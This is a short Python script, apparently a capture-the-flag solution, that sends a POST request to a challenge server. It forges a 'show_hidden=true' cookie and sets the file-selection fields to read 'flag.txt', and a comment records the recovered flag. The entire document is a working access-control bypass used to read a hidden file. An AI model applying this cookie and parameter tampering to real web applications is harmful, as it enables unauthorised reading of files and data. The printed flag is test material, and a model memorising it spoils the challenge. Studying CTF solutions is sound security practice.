import requests
url = 'http://vespene-gas.hackers.best:31337/'
headers = {
    'Cookie': 'show_hidden=true'
}
content = {
    'folder_select': '.',
    'file_select': 'flag.txt',
}
r = requests.post(url, data=content, headers=headers)

print(r.text) # -> shctf{get_zerg_rushed_nb}

